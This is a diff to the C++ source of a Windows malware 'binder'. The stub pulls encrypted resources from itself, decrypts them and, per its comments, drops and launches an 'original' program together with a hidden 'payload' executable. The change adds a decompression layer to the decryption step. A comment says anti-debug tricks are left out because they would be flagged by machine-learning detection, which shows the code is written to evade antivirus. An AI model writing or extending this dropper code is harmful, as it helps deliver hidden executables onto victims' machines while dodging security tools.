@@ -4,10 +4,11 @@
 #include <shlobj.h>
 #include <stdio.h>
 #include <string.h>
+#include "blz.h"
 
 #pragma comment(lib, "shell32.lib")
 
-// Minimal binder: extract resources, decrypt (strip pad), drop, launch.
+// Minimal binder: extract resources, decrypt, decompress, drop, launch.
 // No anti-debug / sandbox / PEB tricks — those flag ML on the outer PE.
 
 static void xorBuf(BYTE* data, DWORD size, const BYTE* key, DWORD keyLen) {
@@ -26,6 +27,41 @@ static bool stripPad(BYTE** data, DWORD* size) {
     BYTE* src = *data + need;
     memmove(*data, src, newSize);
     *size = newSize;
+    return true;
+}
+
+// Decompress an in-place XOR-decrypted blob if it carries a valid BLZ header.
+//
+// The builder compresses first, then XOR-encrypts, so after decryption we get a
+// BLZ2 stream. Returns true and replaces the buffer on success; leaves the buffer
+// untouched (and returns true) when the blob is not compressed, so uncompressed
+// blobs and builds from older builders still load.
+//
+// A raw PE starting with "MZ" can never match the BLZ magic, and we additionally
+// require a self-consistent header (compressedSize <= buffer size), so a false
+// positive is not realistic.
+static bool maybeDecompress(BYTE** data, DWORD* size) {
+    if (!data || !*data || !size || *size < sizeof(BlzHeader)) return true;
+    if (!blzIsCompressed(*data, *size)) return true;
+
+    BlzHeader hdr;
+    memcpy(&hdr, *data, sizeof(hdr));
+
+    // Sanity: the framed sizes must be consistent with what we actually hold.
+    if (hdr.compressedSize != (uint32_t)*size) return false;
+    if (hdr.originalSize == 0 || hdr.originalSize > (256u << 20)) return false;
+
+    BYTE* out = (BYTE*)HeapAlloc(GetProcessHeap(), 0, hdr.originalSize);
+    if (!out) return false;
+
+    if (!blzDecompress(*data, *size, out, hdr.originalSize)) {
+        HeapFree(GetProcessHeap(), 0, out);
+        return false;
+    }
+
+    HeapFree(GetProcessHeap(), 0, *data);
+    *data = out;
+    *size = hdr.originalSize;
     return true;
 }
 
@@ -158,10 +194,16 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     freeBuf(keyData);
     keyData = nullptr;
 
-    // No stripPad — builder XOR-encrypts without padding
-    if (config && configSize) {
-        // Config doesn't need MZ check, just use as-is
+    // The builder compresses each blob before encrypting it, so unwrap the LZ
+    // layer now that the XOR mask is off. A blob without the magic is passed
+    // through unchanged, which keeps builds from older builders working.
+    if (!maybeDecompress(&original, &originalSize) ||
+        !maybeDecompress(&payload, &payloadSize)) {
+        freeBuf(original); freeBuf(payload); freeBuf(config);
+        return 1;
     }
+    if (config && configSize)
+        maybeDecompress(&config, &configSize);
 
     if (originalSize < 64 || payloadSize < 64 ||
         original[0] != 'M' || original[1] != 'Z' ||
